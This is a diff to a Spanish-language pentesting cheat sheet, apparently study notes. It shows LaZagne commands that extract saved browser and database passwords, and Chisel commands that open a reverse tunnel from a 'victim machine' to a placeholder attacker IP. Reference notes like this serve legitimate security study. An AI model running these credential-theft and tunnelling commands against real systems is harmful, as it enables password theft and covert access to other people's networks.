@@ -147,7 +147,6 @@ Es un programa similar a Mimikatz, podrás extraer contraseñas, hashes del sist
 ```
 ./LaZagne.exe browsers   # Extrae contraseñas de los navegadores
 ./LaZagne.exe Databases  # Extrae contraseñas de las BBDD
-
 ```
 
 ## [Chisel](https://github.com/jpillora/chisel/blob/master/README.md) 🔗
@@ -161,8 +160,7 @@ Seguramente ya conozcas este programa, sirve para realizar **Port Forwarding**, 
 
 #### MÁQUINA VÍCTIMA
 ```
-./chisel client <IP-ATACANTE>:1234 R:*<PUERTO-ATACANTE>:127.0.0.1:*<PUERTO-VÍCTIMA>
-
+./chisel.exe client <IP-ATACANTE>:1234 R:*<PUERTO-ATACANTE>:127.0.0.1:*<PUERTO-VÍCTIMA>
 ```
 
 - ***PUERTO-ATACANTE**: Este puerto es el que se abrirá en tu Localhost para acceder a la máquina víctima.
@@ -170,8 +168,7 @@ Seguramente ya conozcas este programa, sirve para realizar **Port Forwarding**, 
 
 #### EJEMPLO
 ```
-./chisel client <IP-ATACANTE>:1234 R:9999:127.0.0.1:3306
-
+./chisel.exe client <IP-ATACANTE>:1234 R:9999:127.0.0.1:3306
 ```
 
 ## 🔗 Links
